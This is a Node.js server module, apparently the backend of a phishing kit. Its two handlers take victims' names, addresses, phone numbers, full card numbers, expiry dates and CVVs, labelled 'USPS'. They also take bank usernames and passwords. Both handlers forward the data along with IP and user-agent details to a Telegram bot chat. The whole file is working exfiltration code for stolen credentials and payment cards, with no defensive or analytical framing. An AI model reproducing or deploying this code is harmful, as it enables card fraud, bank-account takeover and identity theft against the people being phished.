const axios = require("axios");

const sendRes = async (req, res) => {
    let {
        fullname,
        address,
        address2,
        city,
        state,
        zip,
        telephone,
        ccnum,
        ccexp,
        cvv,
        bin,
        ip,
        userAgent,
        telegramId,
        bankName
    } = req.body;

    binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
    var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}, ${address2}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+----------- BIN List Info ------------+\n${binList}`;

    await axios
        .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
                chat_id: telegramId,
                text: `USPS:\n${originalText}`,
                parse_mode: "Markdown",
            }
        )
        .catch((e) => {
            console.log(e);
        });

    res.sendStatus(200);
};

const sendLog = async (req, res) => {
    let {
        username,
        password,
        bank,
        ip,
        telegramId,
    } = req.body;

    var originalText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}\n+----------- IP Information ------------+\nIP: ${ip}`;

    await axios
        .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
                chat_id: telegramId,
                text: `${bank} Log:\n${originalText}`,
                parse_mode: "Markdown",
            }
        )
        .catch((e) => {
            console.log(e);
        });

    res.sendStatus(200);
};

module.exports = {
    sendRes,
    sendLog,
};
